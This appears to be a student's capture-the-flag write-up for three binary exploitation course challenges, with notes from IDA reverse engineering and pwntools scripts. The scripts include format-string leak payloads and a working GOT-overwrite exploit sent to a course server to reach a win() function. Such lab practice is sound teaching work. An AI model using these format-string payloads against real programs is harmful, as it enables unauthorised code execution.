# z5214048

door
=========================== 
Flag: no luck

General overview of problems faced 
------------------------------------- 
Had to hack the program 
1. Put through to IDA
* s and s2 are 200h = 512 bytes apart. if &s(1) = 3, &s2 = 515
* Magic word: APES
2. What blocks the way at "0xffc0b40f"? 9447 ASCII!
3. Dump stack a few times and try to see patterns:
* All other stack entries are past &s2 (i.e. higher than its address), let alone s1
4. Try a simple overflow attack on s1 against s2 (use s1 to overflow s2) -> pipe breaks (why?)
5.  Try replacing the test + jump instructions in the main func to nop's -> Nothing happens (what am I doing wrong?)
6. What can I then hypothetically change with format string vuln? 

* Search "APES" (41504553) in stack dumps -> none
* Search "9447" -> Kinda? There are addresses in stack of ".0x3900252e.0x373434.(nil).". p32'ed string of 9447
7. Try automatic tools to change leaked addr -> Still no luck
```
		# 9447 --(reverse)--> 7449 --(hex)--> 0x37343439
		# APES --(r)--> SEPA -(h)-> 0x53455041
		payload = fmtstr_payload(k, {int(addr,16)-512: 0x53455041}, 1, 'byte')
```

(pretty sure I messed up my code somewhere, that's why)

Script/Command used 
------------------ 
``` 
#!/usr/bin/python3

from pwn import *

import time


PROGRAM_NAME = "door"
ENCODING = "ascii"
MAGIC = "APES".encode(ENCODING) # why not apples, as per cli?

def io_beg():
	return process("./door")
	#remote('plzpwn.me', 2000)
	#process('./jump')	
	
def io_rdy(x):
	return x.recvuntil("Speak the phrase APplES and I shall open:".encode(ENCODING), timeout = 3).decode(ENCODING)

# my 6443 graveyard function
def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	

def main():	
	fin = 0
	stage = 0
	
	while(fin < 1):
		if(stage == 0):
			k = 0
			notfound = 1
			while(notfound):
				io = io_beg()						
				
				io.recvuntil("A landslide has blocked the way at".encode(ENCODING))
				peculiar_addr = io.recvline().decode(ENCODING).strip()
				peculiar_addr_int = int(peculiar_addr, 16)
				
				io_rdy(io)
				buf = toHexCustom(peculiar_addr_int)
				print("peculiar addr: "+buf)
				payload = b'\x90'*k+MAGIC
				
				io.send_raw(b'\x90'*100)
				#io.send_raw(payload) #deploy
				io.sendline(b'') #fire
				
				io.recvuntil("The magical letters begin to shimmer and morph.".encode(ENCODING))
				inbound = io.recvall(timeout = 0.5).decode(ENCODING)
				
				print(inbound)
				
				if(inbound.find("This doesn't satisy the door") != -1):
					print("[bad][k =  "+str(k)+"]")
					k = k + 1
				elif(inbound.find("How did you get") != -1):
					print("[gud][k =  "+str(k)+"]")
					notfound = 0
				else:
					print("[idk][k =  "+str(k)+"]")
					
			io.interactive()
			stage = stage + 1
				
		else:
			print("I think I'm done :)")
			fin = 1

if __name__ == '__main__':
	main()
```

snake
=========================== 
Flag: (I don't get it)

General overview of problems faced 
------------------------------------- 
Had to hack the program 
1. IDA F5:
* s at +0 | v1 at 64h = 100 decimal
* uses fgets for passwd (arrgh), but gets for get_name()
2. Try "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" as name - seg fault
2.1 Try trunkating it slightly, the program accepts it, but so what?
3. Ok whatever. With name changed enter "passwd" with len between 50h and 99. I used "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"Get "error printing flag at ...". It's great, sure, but I cannot output the flag itself, since I input and output different variables. I can hypothetically overwrite the "flag" address that is always printed after passwd, but that doesn't change anything, given the program doesn't try to access that address's value

formatrix
=======================
Flag: COMP6447{i_r8_th15_m0vie_4/12}

General overview of problems faced 
------------------------------------- 
Had to hack the program 
0. Find the variable in stack you control
1. Find a win() func entrypoint
2. Find a function in the global offset table to substitute, and replace it with win()
3. Craft a format string payload to do so, deploy it and here goes

PY3 Format string generator function is BR0KEN!!

Script/Command used 
------------------ 
Python 2!
```
#!/usr/bin/python2

from pwn import *

ENCODING = "ascii"

def main():	
	io = connect('plzpwn.me', 4002)
	payload = fmtstr_payload(3, {0x08049C18:0x08048536},0,'byte')
	print("pay: ["+payload+"]")
	io.recvuntil("You say:")
	io.sendline(payload)
	io.interactive()



if __name__ == '__main__':
	main()
```


